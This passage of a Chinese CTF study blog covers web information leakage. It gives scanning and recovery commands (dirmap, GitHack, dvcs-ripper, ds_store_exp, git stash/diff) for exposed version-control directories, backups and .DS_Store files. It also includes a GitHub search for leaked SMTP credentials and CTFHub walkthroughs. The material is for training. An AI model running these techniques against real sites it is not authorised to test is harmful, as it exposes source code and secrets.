    <content type="html"><![CDATA[<h1 id="CTF中的信息泄露"><a href="#CTF中的信息泄露" class="headerlink" title="CTF中的信息泄露"></a>CTF中的信息泄露</h1><p>一般先用dirmap扫一下，看下有没有信息泄露，CTF中不太建议用御剑的那些字典，很多没用的不必要扫</p><blockquote><p>python3 dirmap.py -i <a href="https://target.com/">https://target.com</a> -lcf</p></blockquote><h1 id="网站备份文件"><a href="#网站备份文件" class="headerlink" title="网站备份文件"></a>网站备份文件</h1><p>在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</p><p>比如扫到<a href="http://www.zip等,这种一般是出题人直接给代码让你审计了/">www.zip等，这种一般是出题人直接给代码让你审计了</a></p><p>其它格式</p><blockquote><ul><li>.rar</li><li>.zip</li><li>.7z</li><li>.tar.gz</li><li>.bak</li><li>.txt</li><li>.old</li><li>.temp</li></ul></blockquote><h1 id="vim文件"><a href="#vim文件" class="headerlink" title="vim文件"></a>vim文件</h1><blockquote><p>程序员使用vim编辑器编写一个<code>index.php</code>文件时，会有一个<code>.index.php.swp</code>文件，如果文件正常退出，则该文件被删除，如果异常退出，该文件则会保存下来，该文件可以用来恢复异常退出的index.php，同时多次意外退出并不会覆盖旧的<code>.swp</code>文件，而是会生成一个新的，例如<code>.swo</code>文件。</p><p>以 index.php 为例 第一次产生的缓存文件名为 .index.php.swp<br>第二次意外退出后，文件名为.index.php.swo<br>第三次产生的缓存文件则为 .index.php.swn<br>注意：index前有 “ . “</p></blockquote><p>可以用vim的时候试一下，一般都是swp，但有次比赛遇到了swo</p><p>恢复文件<code>vim -r 恢复的文件名</code></p><p>默认情况下使用Vim编程，在修改文件后系统会自动生成一个带<code>~</code>的备份文件，某些情况下可以对其下载进行查看</p><h1 id="git源码泄漏"><a href="#git源码泄漏" class="headerlink" title="git源码泄漏"></a>git源码泄漏</h1><p>能扫描到以下目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://url/.git/</span><br><span class="line">http://url/.git/config </span><br></pre></td></tr></table></figure><p>Git是一个开源的分布式版本控制系统，在执行<code>git init</code>初始化目录的时候，会在当前目录下自动创建一个<code>.git</code>目录，用来记录代码的变更记录等。发布代码的时候，如果没有把<code>.git</code>这个目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码。</p><p>利用<a href="https://github.com/lijiejie/GitHack">GitHack</a>进行信息读取：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http://url/.git/ </span><br></pre></td></tr></table></figure><p>或者<a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-git.pl -v -u http://url/.git </span><br></pre></td></tr></table></figure><p>git相关命令</p><blockquote><p>git log可以查看提交历史<br>git diff查看git提交的不同处<br>stash命令可用于临时保存和恢复修改，可跨分支<br>git stash list查看所有保存的记录列表<br>git stash pop，从 git 栈中弹出来一个文件</p></blockquote><hr><p><strong>git stash 的作用</strong><br>git stash用于想要保存当前的修改,但是想回到之前最后一次提交的干净的工作仓库时进行的操作.git stash将本地的修改保存起来,并且将当前代码切换到HEAD提交上.</p><p>通过git stash存储的修改列表,可以通过git stash list查看.git stash show用于校验,git stash apply用于重新存储.直接执行git stash等同于git stash save.</p><p>最新的存储保存在refs&#x2F;stash中.老的存储可以通过相关的参数获得,例如stash@{0}获取最新的存储,stash@{1}获取次新.stash@{2.hour.ago}获取两小时之前的.存储可以直接通过索引的位置来获得stash@{n}.</p><p><strong>git stash的概念理解</strong><br>git stash的每个存储单元在工作仓库中是通过commit的形式由树结构展示的.它的根节点是HEAD所在的提交<br><img src="https://img-blog.csdnimg.cn/20200825145004389.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MjIyMDUw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>1.打开题目环境<br><img src="https://img-blog.csdnimg.cn/20200825145326980.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MjIyMDUw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">2.使用githack工具进行扫描，如何使用可以百度一下，或者看我上一篇文章有提到。<br><img src="https://img-blog.csdnimg.cn/20200825145709754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MjIyMDUw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3.扫描完成后，在目录里面会生成一个新的文件，进去之后按住shift单机鼠标右键选择git base here，执行git stash list ：查看stash了哪些存储。<br><img src="https://img-blog.csdnimg.cn/20200825150812969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MjIyMDUw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">4.执行git stash pop</p><blockquote><p>恢复之前缓存的工作目录，将缓存堆栈中的对应stash删除，并将对应修改应用到当前的工作目录下,默认为第一个stash,即stash@{0}，如果要应用并删除其他stash，命令：git stash pop stash@{$num} ，比如应用并删除第二个：git stash pop stash@{1}）</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200825150955455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MjIyMDUw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">5.目录下生成了新的txt文件 ，我们查看获取flag。<img src="https://img-blog.csdnimg.cn/20200825151253183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MjIyMDUw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr><h1 id="CTFHub-Git泄露-Log"><a href="#CTFHub-Git泄露-Log" class="headerlink" title="CTFHub-Git泄露-Log"></a>CTFHub-Git泄露-Log</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>以前虽然学过git，但是时间久远，而且没有和安全方面联系起来。这道Git泄露题可以说是比较简单，帮助我慢慢架构起git的知识。</p><h2 id="题目背景"><a href="#题目背景" class="headerlink" title="题目背景"></a>题目背景</h2><p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>做这道题需要简单知道git的相关命令，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log 显示从最近到最远的提交日志。 </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git diff 简单的来说就是查看不同，具体用法如下：</span><br><span class="line">1. git diff：是查看working tree与index的差别的。</span><br><span class="line">2. git diff --cached：是查看index与repository的差别的。</span><br><span class="line">3. git diff HEAD：是查看working tree和repository的差别的。其中：HEAD代表的是最近的一次commit的信息。 </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset 可用于回退版本库 </span><br></pre></td></tr></table></figure><p>以及Githack（注意，githack需要在python2中才能使用，而且github上面有一个githack是不能用的，我一开始就下了那个不能用了结果弄了很久。）的相关用法。</p><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>打开之后进行dirsearch扫描，发现存在git泄露，使用Githack</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 githack.py http://challenge-20523a0b6899c975.sandbox.ctfhub.com:10080/.git/ </span><br></pre></td></tr></table></figure><p>之后进入githack下的dist里的本题的目录。<br><img src="https://img-blog.csdnimg.cn/20200903185811220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>正常进入之后应该只有.log文件，我这里有其他的东西是因为我已经回退版本了，往下看就懂了。如果没有.log应该是被隐藏了。然后打开cmd或者bash都可,输入git log显示提交日志。<br><img src="https://img-blog.csdnimg.cn/20200903190209230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们可以看到有三次操作，一次是init初始化现有仓库，经过这次命令就会产生.log文件。之后执行了add flag和remove flag。可以判断，flag应该是在add flag的那个版本，我们现在是在remove flag。所以，这题有两种解法，第一种是回退到之前的版本，git reset可以实现。第二种是直接查看add flag和remove flag这两个版本的不同，git diff可以实现。</p><p>方法一：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard HEAD^ </span><br></pre></td></tr></table></figure><p>方法二：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff HEAD^ </span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210506114558483.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pYV19OVURU,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff 37688f87d181f65bbb8be58d69adb16941908440 </span><br></pre></td></tr></table></figure><hr><h1 id="ctfhub技能树—信息泄露—git泄露—index"><a href="#ctfhub技能树—信息泄露—git泄露—index" class="headerlink" title="ctfhub技能树—信息泄露—git泄露—index"></a><a href="https://www.cnblogs.com/anweilx/p/12455850.html">ctfhub技能树—信息泄露—git泄露—index</a></h1><p>打开靶机</p><p><img src="https://img2020.cnblogs.com/i-beta/1753051/202003/1753051-20200310150251917-1149440296.png"></p><p> 查看页面信息</p><p><img src="https://img2020.cnblogs.com/i-beta/1753051/202003/1753051-20200310150309064-1394916937.png"></p><p> 使用dirsearch进行扫描</p><p><img src="https://img2020.cnblogs.com/i-beta/1753051/202003/1753051-20200310151115538-2077300558.png"></p><p> 使用githack工具处理git泄露情况</p><p><img src="https://img2020.cnblogs.com/i-beta/1753051/202003/1753051-20200310151222137-1909013470.png"></p><p> 使用git log命令查看历史记录</p><p><img src="https://img2020.cnblogs.com/i-beta/1753051/202003/1753051-20200310151257631-1998233360.png"></p><p> 与 <code>add flag 9b5b58……</code> 这次提交进行比对</p><p>即可拿到flag</p><p><img src="https://img2020.cnblogs.com/i-beta/1753051/202003/1753051-20200310151400149-899771850.png"></p><p>方法二</p><p>使用git checkout命令查询输出文件</p><p><img src="https://img2020.cnblogs.com/i-beta/1753051/202003/1753051-20200310151720378-145511497.png"></p><p> 输入234261473210834.txt文件</p><p>文件内即为flag</p><p><img src="https://img2020.cnblogs.com/i-beta/1753051/202003/1753051-20200310151856171-705808302.png"></p><p>命令解释</p><p>创建新分支：git branch branchName</p><p>切换到新分支：git checkout branchName</p><p>然后，上面两个命令也可以合成为一个命令：</p><p>git checkout -b branchName</p><p>方法三<br>直接进入目录，查看txt文档，flag在文档中。</p><hr><h1 id="hg泄露"><a href="#hg泄露" class="headerlink" title="hg泄露"></a>hg泄露</h1><p>能扫到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://url/.hg/ </span><br></pre></td></tr></table></figure><p>与git类似, hg在初始化项目时, 会在项目的根目录下创建一个名为<code>.hg</code>的隐藏文件夹,里面包含了代码和分支的修改记录和开发人员的相关信息. 当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。</p><p><a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-hg.pl -v -u http://url/.hg </span><br></pre></td></tr></table></figure><h1 id="SVN-源码泄露"><a href="#SVN-源码泄露" class="headerlink" title="SVN 源码泄露"></a>SVN 源码泄露</h1><p>能扫到以下目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://url/.svn/entries </span><br></pre></td></tr></table></figure><p>SVN是一个开放源代码的版本控制系统。在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息。网站管理员在发布代码时，没有使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使.svn隐藏文件夹被暴露于外网环境，可以利用.svn&#x2F;entries文件，获取到服务器源码。</p><p><a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-svn.pl -v -u http://www.example.com/.svn/ </span><br></pre></td></tr></table></figure><h1 id="bzr-x2F-Bazaar泄露"><a href="#bzr-x2F-Bazaar泄露" class="headerlink" title="bzr&#x2F;Bazaar泄露"></a>bzr&#x2F;Bazaar泄露</h1><p>能扫到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://url/.bzr/ </span><br></pre></td></tr></table></figure><p>bzr也是个版本控制工具, 在初始化项目时(bzr init&#x2F;init-repo), 会在项目根目录产生名为<code>.bzr</code>的隐藏目录, 同样暴露了源代码和用户信息.</p><p><a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-bzr.pl -v -u http://www.example.com/.bzr/ </span><br></pre></td></tr></table></figure><h1 id="CVS泄漏"><a href="#CVS泄漏" class="headerlink" title="CVS泄漏"></a>CVS泄漏</h1><p>能扫到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://url/CVS/Root 返回根信息 </span><br><span class="line">http://url/CVS/Entries 返回所有文件的结构 </span><br></pre></td></tr></table></figure><p>cvs项目在初始化(cvs checkout <code>project</code>)的时候, 会在<code>project</code>目录下创建一个名为<code>CVS</code>的目录,<br>其中保存了各个文件的修改和commit记录. 通过此目录可以获取代码的历史版本. 其中两个关键文件为:<br><code>CVS/Root</code>和<code>CVS/Entries</code>, 分别记录了项目的根信息和所有文件的结构</p><p><a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-cvs.pl -v -u http://www.example.com/CVS/ </span><br></pre></td></tr></table></figure><h1 id="DS-Store-文件泄露"><a href="#DS-Store-文件泄露" class="headerlink" title="DS_Store 文件泄露"></a>DS_Store 文件泄露</h1><p>能扫到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://url/.DS_Store </span><br></pre></td></tr></table></figure><p>.DS_Store是Mac下Finder用来保存如何展示 文件&#x2F;文件夹 的数据文件，每个文件夹下对应一个。如果将.DS_Store上传部署到服务器，可能造成文件目录结构泄漏，特别是备份文件、源代码文件。</p><p><a href="https://github.com/lijiejie/ds_store_exp">dsstoreexp</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ds_store_exp.py http://url/.DS_Store </span><br></pre></td></tr></table></figure><h1 id="WEB-INF-x2F-web-xml泄露"><a href="#WEB-INF-x2F-web-xml泄露" class="headerlink" title="WEB-INF&#x2F;web.xml泄露"></a>WEB-INF&#x2F;web.xml泄露</h1><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p><p>通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。</p><p>WEB-INF主要包含一下文件或目录：</p><ul><li><code>/WEB-INF/web.xml</code>：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</li><li><code>/WEB-INF/classes/</code>：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</li><li><code>/WEB-INF/lib/</code>：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</li><li><code>/WEB-INF/src/</code>：源码目录，按照包名结构放置各个java文件。</li><li><code>/WEB-INF/database.properties</code>：数据库配置文件漏洞检测以及利用方法</li></ul><p>利用：</p><p>通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://url/WEB-INF/web.xml </span><br></pre></td></tr></table></figure><h1 id="GitHub源码泄漏"><a href="#GitHub源码泄漏" class="headerlink" title="GitHub源码泄漏"></a>GitHub源码泄漏</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/search?q=smtp+user+@qq.com&amp;type=code </span><br></pre></td></tr></table></figure><h3 id="ctfhub–web–信息泄露"><a href="#ctfhub–web–信息泄露" class="headerlink" title="ctfhub–web–信息泄露"></a>ctfhub–web–信息泄露</h3><ul><li><ul><li><ul><li><a href="#1_1">1.目录遍历</a></li><li><a href="#2phpinfo_5">2.phpinfo</a></li><li><a href="#3__8">3. 备份文件下载</a></li><li><a href="#4Github_27">4.Github泄露</a></li><li><a href="#5SVN_50">5.SVN泄露</a></li><li><a href="#6HG_52">6.HG泄露</a></li></ul></li></ul></li></ul><h3 id="1-目录遍历"><a href="#1-目录遍历" class="headerlink" title="1.目录遍历"></a>1.目录遍历</h3><p><img src="https://img-blog.csdnimg.cn/52f4e1b0a44047e0a554c913e65295b6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h3 id="2-phpinfo"><a href="#2-phpinfo" class="headerlink" title="2.phpinfo"></a>2.phpinfo</h3><p>flag.在phpinfo里<br><img src="https://img-blog.csdnimg.cn/41ceee4ef08e40e395b55737f317155a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h3 id="3-备份文件下载"><a href="#3-备份文件下载" class="headerlink" title="3. 备份文件下载"></a>3. 备份文件下载</h3><p><em>a.网站源码</em><br><img src="https://img-blog.csdnimg.cn/3361af932fd446498e294ae1e1f57d13.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>遍历以上备份文件名<br><img src="https://img-blog.csdnimg.cn/a7b20f3c97c44b20b5a147b8dac2af29.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/79a9365251f04d9590a3e19363334a68.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/a7680b5ebac44afaad757ce5afc13ad8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>在url中访问flag文件<br><img src="https://img-blog.csdnimg.cn/53c5abc2fa33410a9946afe877f6f41c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><em>b.bak文件</em></p><p>访问<code>/index.php.bak</code>为常用备份文件名<br><img src="https://img-blog.csdnimg.cn/8b9e37a732274c59b046d4f8e23d2894.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/0e5948773d274554bc7ccf9af608878b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><em>c.vim缓存</em></p><p>vim编辑时异常退出，会产生缓存文件，后缀为<code>.swp</code>,第二次产生为<code>.swo</code>，第三次为<code>.swn</code>此文件为隐藏文件，所以查看时应在最前面加一个<code>.</code>，如<code>.index.php.swp</code><br><img src="https://img-blog.csdnimg.cn/53107e852ee84e2281450c008f81478f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/08183ad12742417e98dac6ceb14292bd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><em>d…DS_Store</em></p><p>.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。<br><img src="https://img-blog.csdnimg.cn/15406ff490df401ba44129eeba0d6b80.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/8bf8d39cbbd240e3ab9f8aff87d25acb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/ea656738203d4c96b2b7b5d3d2a8cb38.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h3 id="4-Github泄露"><a href="#4-Github泄露" class="headerlink" title="4.Github泄露"></a>4.Github泄露</h3><p><em>a.log</em></p><p>下载dirsearch<br><img src="https://img-blog.csdnimg.cn/a1f10f6fae044bfb911b11e5115e1545.png" alt="在这里插入图片描述">下载GitHub<br><img src="https://img-blog.csdnimg.cn/d81f0326a8994d43bcb06a0245b4d132.png" alt="在这里插入图片描述">先通过dirsearch扫描敏感目录<br><img src="https://img-blog.csdnimg.cn/afd38fb82edd49efabc14ae2628be7c6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">发现存在git泄露漏洞<br><img src="https://img-blog.csdnimg.cn/9956f4a871564d8cb70201d452868eff.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">将git文件保存在本地<br><img src="https://img-blog.csdnimg.cn/c098cb34a5574145ba13d7185c7061e6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/fb192f763bb74beca86e5f561743a85d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">查看日志<br><img src="https://img-blog.csdnimg.cn/e0c180cf7015447aafc3526992945b87.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">显示内容<br><img src="https://img-blog.csdnimg.cn/10319a69e194406f996e622a434cd42d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><em>b.stash</em></p><p>方法同上<br><img src="https://img-blog.csdnimg.cn/78b610c9efa143adab44197569cb540e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/f35f01f26caf4397b96cd266c27746b3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/56ed985cee054427a3454b6c1dd7d2ef.png" alt="在这里插入图片描述"><code>git stash list</code>查看所有被隐藏的文件列表,<br><code>git stash pop</code>默认恢复git栈中最新的一个stash@{num}<br>弹出了10707936525229.txt文件，里面存在flag文件<br><img src="https://img-blog.csdnimg.cn/ef0a559310404c6799045abe0c7a1ac7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><em>3.index</em><br><img src="https://img-blog.csdnimg.cn/5835b40cbcbc4cfe870fd59b2c538575.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/fd1dd7be768c4e08b028972b115c76a9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h3 id="5-SVN泄露"><a href="#5-SVN泄露" class="headerlink" title="5.SVN泄露"></a>5.SVN泄露</h3><p><img src="https://img-blog.csdnimg.cn/daa8d4f379794d3a96b18d11d838d6e6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/8fe78e15438d4c69b7092bbcea6b9ece.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/8f2c59d868d14705a93d5a577e499935.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARuOAgk4g5Zi_5Zi_,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h3 id="6-HG泄露"><a href="#6-HG泄露" class="headerlink" 